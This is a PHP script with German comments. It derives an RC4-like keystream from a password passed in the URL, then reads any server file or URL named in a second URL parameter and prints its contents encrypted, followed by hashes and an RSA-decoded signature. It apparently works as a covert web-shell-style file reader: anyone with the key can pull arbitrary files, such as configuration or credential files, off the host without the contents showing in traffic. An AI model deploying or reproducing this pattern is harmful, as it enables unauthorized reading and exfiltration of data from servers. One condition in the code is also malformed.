<?
$nrsa="150870698026440038419683415398831270435854495149046548551487894391977767311598021645491503741000766826342132662990755231028231774788567782956740971982159040674322563762601423608958344853467992355144688079915248399913263795093211871319393924002095301928521997938680195084090499280213738443405450414878058943603";
$ersa=13;
$sig="106864793053131497909895628022190135109404021262851008167952328392308919960729995731082532420751676693877931424592954558993343012026824968515090493020509162278281233744239062436610793566372333691825498302993126164783154221745602145394660558320158577066273676547075919967993803928184345449465131104383852795289";
function tonum($x){
    $res = "0";
    for($i=0;
        $i<strlen($x);
        $i++){
          $res = bcadd (bcmul($res,"256"), ord($x{$i}));
        }
    return $res;
  } 

function num2txt($x){
    $res = "";
    while ($x != "0"){
      $res = chr(bcmod($x,"256")) . $res;
      $x = bcdiv($x, "256");
    } 
    return $res;
}

function powm($x, $e, $n){
  $res = "1";
  while ($e != "0"){
     if ( bcmod($e, "2") == "1" ){
       $res = bcmod(bcmul($x,$res),$n);
     }
     $x = bcmod(bcmul($x,$x),$n);
     $e = bcdiv($e, "2");
  } 
  return $res;
}

   if (strlen($_GET["p"]) > 0) {
    
    $s = array(257);
    $kl = strlen( $_GET["p"] );

    for ($i = 0; $i < 256; $i++) {
        $s[$i] = chr( $i );
    }

    $j = strlen($_GET["p"]);
    for ($i = 0; $i < 256; $i++) {
         $j = ($j + ord($s[$i]) + ord($_GET["p"]{$i % $kl}) ) % 256; 
         $tmp = $s[$i];
         $s[$i] = $s[$j];
         $s[$j] = $tmp;   
     }
     $i = ord($s[0]);
     $j = ord($s[1]);
     $k = ord($s[2]);
     $z = ord($s[3]);
     $w = (2*ord($s[4]) + 1) % 256;
#     printState($s,$i,$j,$k,$w);

  }

# 133825ce789f9ab1bce3ef019d08317a25047c6b  j.php
# 
# Datei zum lesen oeffnen.
# Auch eine URL ist als "Dateiname" 
# zulaessig.
#

 if (strlen($_GET['f'] && file_exists($_GET['f']))>0) {
    $fnam = $_GET['f'];

    if (file_exists($fnam))
    {
      $fp  = fopen($fnam, 'r');
#        header("Content-Type: image/png\n\n");
        header("Content-Type: text/html\n\n");
    }

    if (! $fp ) {
       echo "________FEHLER________ <p>";
    }

    $iv = 15;      
    $inhalt = '';
    while ( ($cur = fgetc($fp)) !== false ) {
#       j = j + iv;
#       i = (i + w) & 255;
#       j = (k + S[(j + S[i]) & 255]) & 255;
#       k = (i + k + S[j]) & 255;		 
#       tmp = S[i]; S[i] = S[j]; S[j] = tmp;    
#       rnd = S[(j + k) & 255];
        $inhalt .= $cur;     
        $j = ($j + $iv) % 256;
        $i = ($i + $w) % 256;
        $tmp = ord( $s[$i] );
        $j = (ord( $s[ ($j + $tmp) % 256 ]) + $k) % 256;
        $tmp = ord( $s[$j] );
        $k = ($k + $i + $tmp) % 256;
        $tmp = $s[$i];
        $s[$i] = $s[$j];
        $s[$j] = $tmp;    
        $outx = ord ( $s[ ($j + $k) % 256] ) ^ ord($cur); 
        $iv = ord($cur); 
        print chr($outx);
      }
      fclose($fp);
      print "<br>HASH: " . sha1($inhalt);
      print "<br>HASH: " . num2txt(powm($sig, $ersa, $nrsa));
  }
?>
